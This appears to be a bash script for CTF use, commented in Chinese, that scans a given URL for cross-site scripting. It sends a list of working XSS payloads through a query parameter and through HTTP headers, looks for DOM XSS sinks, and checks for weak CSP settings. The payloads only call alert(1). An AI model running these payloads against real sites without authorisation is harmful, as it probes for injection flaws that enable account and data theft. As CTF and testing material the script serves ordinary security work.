#!/bin/bash
# CTF XSS检测
# 用法: bash xss.sh <URL> [PARAM]

URL="${1:?用法: bash xss.sh <URL> [PARAM]}"
PARAM="${2:-q}"

echo "=========================================="
echo "  XSS检测: $URL"
echo "=========================================="

urlencode() { /usr/bin/python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }

echo -e "\n[1/4] 反射型XSS检测"
XSS_PAYLOADS=(
    '<script>alert(1)</script>'
    '"><script>alert(1)</script>'
    "'-alert(1)-'"
    '<img src=x onerror=alert(1)>'
    '<svg onload=alert(1)>'
    '<body onload=alert(1)>'
    'javascript:alert(1)'
    '<iframe src="javascript:alert(1)">'
    '"><img src=x onerror=alert(1)>'
    "' onmouseover='alert(1)"
    "{{constructor.constructor('alert(1)')()}}"
    "<details open ontoggle=alert(1)>"
    "<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    encoded=$(urlencode "$payload")
    resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -qF "$payload"; then
        echo -e "  \033[31m[!] XSS反射! Payload: $payload\033[0m"
        break
    fi
done

echo -e "\n[2/4] DOM XSS检测"
curl -sk "$URL" 2>/dev/null | grep -oiP '(document\.(URL|documentURI|referrer|location)|window\.(name|location)|location\.(href|hash|search))' | sort -u | head -10

echo -e "\n[3/4] HTTP头注入"
for header in "Referer" "User-Agent" "X-Forwarded-For" "Cookie"; do
    resp=$(curl -sk -H "$header: <script>alert(1)</script>" "$URL" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -qF '<script>alert(1)</script>'; then
        echo -e "  \033[31m[!] $header头注入XSS!\033[0m"
    fi
done

echo -e "\n[4/4] CSP分析"
csp=$(curl -sk -D- "$URL" 2>/dev/null | grep -i "content-security-policy")
if [ -n "$csp" ]; then
    echo "  CSP: $csp"
    echo "$csp" | grep -q "'unsafe-inline'" && echo -e "  \033[33m[?] unsafe-inline!\033[0m"
    echo "$csp" | grep -q "'unsafe-eval'" && echo -e "  \033[33m[?] unsafe-eval!\033[0m"
    echo "$csp" | grep -q "data:" && echo -e "  \033[33m[?] data: scheme allowed!\033[0m"
else
    echo "  无CSP头"
fi

echo -e "\n=========================================="
echo "XSS检测完成"
echo "=========================================="
